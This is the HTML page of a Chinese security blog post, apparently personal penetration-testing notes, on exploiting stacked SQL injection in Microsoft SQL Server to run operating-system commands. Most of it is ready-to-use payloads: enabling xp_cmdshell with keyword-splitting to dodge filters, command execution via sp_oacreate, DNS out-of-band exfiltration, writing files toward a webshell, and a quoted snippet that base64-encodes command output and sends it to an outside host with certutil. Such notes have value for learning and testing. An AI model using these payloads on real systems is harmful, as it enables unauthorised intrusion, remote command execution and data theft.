@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CKMT2J522R"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-CKMT2J522R', { 'anonymize_ip': false });
+}
+</script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  MSSQL注入与命令执行 &ndash; 春田花花幼稚园
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="为那个研究怎么在站库分离情况下利用MSSQL注入漏洞的通宵，补充一点笔记。
+|blog under go1f.github.io">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花幼稚园">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="http://92643.cn:92">
+    春田花花幼稚园
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/whisper/">
+      
+      <span>离骚</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/skill/">
+      
+      <span>拙技</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/glance/">
+      
+      <span>速览</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">MSSQL注入与命令执行</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2023-06-17. Published at: 2022-11-08.">
+        
+          Lastmod: 2023-06-17
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>为那个研究怎么在站库分离情况下利用MSSQL注入漏洞的通宵，补充一点笔记。</p>
+<h2 id="存在堆叠注入">存在堆叠注入</h2>
+<pre tabindex="0"><code>test&#39;;WAITFOR DELAY &#39;0:0:5&#39;;--00
+</code></pre><h2 id="开启xp_cmdshell">开启XP_cmdshell</h2>
+<p>原始命令</p>
+<pre tabindex="0"><code>select * from master.dbo.sysobjects where xtype=&#39;x&#39; and name like &#39;xp_%&#39;
+
+exec sp_configure &#39;show advanced options&#39;,1;
+reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;,1;
+reconfigure;
+</code></pre><p>payload举例</p>
+<pre tabindex="0"><code>1&#39;;\nexec+sp_configure+&#39;show+advanced+options&#39;,1;\nreconfigure;\ndeclare+@cmd+varchar(128);\nset+@cmd+=+(\nselect+&#39;xp_cm&#39;%252b&#39;dshell&#39;);\nexec+sp_configure+@cmd,1;\nreconfigure;----000
+</code></pre><p>另一种命令执行实例</p>
+<pre tabindex="0"><code>declare @shell int
+exec sp_oacreate &#39;wscript.shell&#39;,@shell output 
+exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;C:\\Windows\\Temp\\sqltest2.txt&#39;;
+</code></pre><p>无回显</p>
+<h3 id="法1dnslog"><strong>法1:dnslog</strong></h3>
+<pre tabindex="0"><code>1&#39;;\nexec+\nxp_cmdshell+&#39;nslookup+1.kokoisko.dnslog.cn+114.114.114.114&#39;;---000
+</code></pre><p>无回显，不出网：</p>
+<h3 id="法2存储执行命令结果到数据库">法2:存储执行命令结果到数据库</h3>
+<p>创建表sqlioutput，暂存数据</p>
+<pre tabindex="0"><code>#表1：仅数据列
+create table sqlioutput(data varchar(max));
+#表2：带ID排序
+test&#39;;CREATE TABLE sqlmapoutput(id INT PRIMARY KEY IDENTITY, data NVARCHAR(4000))--
+</code></pre><p>执行命令</p>
+<pre tabindex="0"><code>#表1：仅数据
+insert into sqlioutput exec xp_cmdshell &#39;whoami&amp;&amp;ipconfig&#39;;
+
+#表2：带ID排序，16进制字符串转码
+DECLARE @gqrl VARCHAR(8000);
+SET @gqrl=0x77686f616d69;
+INSERT INTO sqlmapoutput(data) EXEC master..xp_cmdshell @gqrl--
+</code></pre><p>读取执行结果</p>
+<pre tabindex="0"><code>#表1读法
+1&#39;AND substring((\nselect * \nfrom sqlioutput FOR XML PATH(&#39;&#39;)),0,3000)=1;----000
+
+#表2读法
+test&#39; UNION ALL SELECT NULL,NULL,(SELECT data FROM sqlioutput ORDER BY id FOR JSON AUTO, INCLUDE_NULL_VALUES),NULL,NULL--
+</code></pre><p>清空暂存表</p>
+<pre tabindex="0"><code>#清数据
+TRUNCATE TABLE sqlioutput;
+#或清数据
+DELETE FROM sqlioutput;
+#完全删表
+DROP FROM sqlioutput;
+</code></pre><p>站库不分离：</p>
+<h3 id="法3查找网站路径写入webshell">法3:查找网站路径写入webshell</h3>
+<p>在D盘全盘查找名称为website的文件或文件夹</p>
+<pre tabindex="0"><code>dir d:\website /s /b
+</code></pre><p>写入文件到目录，带中文的路径要<a href="www.jsons.cn/utf8/">UTF8转码</a>。</p>
+<pre tabindex="0"><code>echo gggg^&lt;^&gt;gg &gt; d:/www12.html
+</code></pre><p>重定向符号要做两次URL转码。并时刻留意命令行输出情况，正常写入命令行是无输出的。</p>
+<pre tabindex="0"><code>echo+ggg+%25%33%65%25%33%65+d:\\chengxu%u5305\\output\\www22.html
+</code></pre><p>不出网靠报错回显，是哪里错哪里停，后面不执行。所以不能寄望一次报错注入请求就能查看命令执行情况？</p>
+<p>不过，在出网的时候可以参考下面语句，挺优雅。</p>
+<p><a href="https://www.secpulse.com/archives/75851.html">红队故事0x01:从MSSQL到命令执行</a></p>
+<pre tabindex="0"><code>declare @r  varchar(4120),@cmdOutput varchar(4120);
+declare @res TABLE(line  varchar(max));
+insert into @res exec  xp_cmdshell &#39;COMANDO&#39;;
+set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as  &#39;text()&#39; from @res for xml path(&#39;&#39;)) as varbinary(max))) for xml  path(&#39;&#39;),binary base64);
+set @r=concat(&#39;certutil  -urlcache -f https://redteam/&#39;,@cmdOutput);
+exec xp_cmdshell @r;  
+</code></pre><h2 id="tips">Tips</h2>
+<p>简单绕过关键字过滤</p>
+<pre tabindex="0"><code>\nselect
+\nfrom
+大小写aNd
+1e0or
+</code></pre><p>改写xp_cmdshell</p>
+<pre tabindex="0"><code>declare @cmd varchar(128) ;
+set @cmd = (select &#39;xp_cm&#39;+&#39;dshell&#39;) ;
+exec sp_configure @cmd,1;
+</code></pre><p>MSSQL字符串拼接</p>
+<pre tabindex="0"><code>execute(&#39;sel&#39;%2b&#39;ect convert(int,@@version)&#39;);
+select concat(&#39;sel&#39;,&#39;ect&#39;);
+</code></pre><p>IIS默认网站目录，C:\inetpub\wwwroot</p>
+<p><strong>Windows命令行查找文件</strong></p>
+<p>1、在cmd中查找文件，例如在c盘下查找3.txt</p>
+<pre tabindex="0"><code>dir c:\3.txt /s /b
+</code></pre><p>/s 显示指定目录和所有子目录中的文件。</p>
+<p>/b 使用空格式(没有标题信息或摘要)。</p>
+<p>2、查找d盘aaa目录下包含abc的所有文件</p>
+<pre tabindex="0"><code>findstr /s /n &#34;abc&#34; d:\aaa\*
+</code></pre><p>/s 在当前目录和所有子目录中搜索匹配文件。</p>
+<p>/n 在匹配的每行前打印行数。</p>
+<p>3、查找可执行文件使用where命令，类似linux下的which命令</p>
+<pre tabindex="0"><code>where cmd
+</code></pre><p>4、文件中搜索字符串</p>
+<pre tabindex="0"><code>find /N /I &#34;pid&#34; 555.txt
+</code></pre><p>//在5.txt文件中忽略大小写查找pid字符串，并带行号显示查找后的结果</p>
+<p>/N 显示行号。</p>
+<p>/I 搜索字符串时忽略大小写。</p>
+<p>/C 仅显示包含字符串的行数。</p>
+<p>/V 显示所有未包含指定字符串的行。</p>
+<h2 id="参考链接">参考链接</h2>
+<p><a href="https://xz.aliyun.com/t/9475#toc-10">MSSQL数据库攻防实战指北</a></p>
+<p><a href="https://www.freebuf.com/vuls/276814.html">搭建环境-数据库安全之MSSQL渗透</a></p>
+<p><a href="https://www.secpulse.com/archives/75851.html">红队故事0x01:从MSSQL到命令执行</a></p>
+<p><a href="https://blog.csdn.net/busai2/article/details/81131558">CMD中查找文件和文件内容</a></p>
+<p><a href="https://xz.aliyun.com/t/7534#toc-0">Mssql数据库命令执行总结</a></p>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>MSSQL注入与命令执行</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#存在堆叠注入">存在堆叠注入</a></li>
+    <li><a href="#开启xp_cmdshell">开启XP_cmdshell</a>
+      <ul>
+        <li><a href="#法1dnslog"><strong>法1:dnslog</strong></a></li>
+        <li><a href="#法2存储执行命令结果到数据库">法2:存储执行命令结果到数据库</a></li>
+        <li><a href="#法3查找网站路径写入webshell">法3:查找网站路径写入webshell</a></li>
+      </ul>
+    </li>
+    <li><a href="#tips">Tips</a></li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav></div>
+  
+
+  
+    <div>
+      
+    </div>
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    © jyufu 2020-2023 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
